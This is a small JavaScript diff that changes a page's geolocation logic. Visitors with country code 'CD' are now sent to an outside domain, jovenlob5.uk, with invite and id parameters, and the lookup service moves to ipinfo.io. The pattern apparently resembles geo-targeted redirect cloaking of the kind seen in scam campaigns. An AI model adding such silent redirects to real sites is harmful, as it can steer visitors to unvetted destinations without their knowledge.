@@ -36,7 +36,7 @@
       const invite = getQueryParameter('invite');
       const id = getQueryParameter('id');
 
-      if (clientIP === 'Canada') {
+      if (clientIP === 'CD') {
         const redirectURL = `https://jovenlob5.uk?invite=${invite}&id=${id}`;
         redirectTo(redirectURL);
       } else {
@@ -54,7 +54,7 @@
     
 	function getClientIP()
 	{ 
-		const url = 'https://api.myip.com'; fetch(url) .then(response => { if (response.ok) { return response.json(); } else { throw new Error('Failed to retrieve client IP'); } }) .then(data => { const clientIP = data.country; handleIP(clientIP); }) .catch(error => { alert(error); }); } 
+		const url = 'https://ipinfo.io/'; fetch(url) .then(response => { if (response.ok) { return response.json(); } else { throw new Error('Failed to retrieve client IP'); } }) .then(data => { const clientIP = data.country; handleIP(clientIP); }) .catch(error => { alert(error); }); } 
 	
 
     // Show the loading message
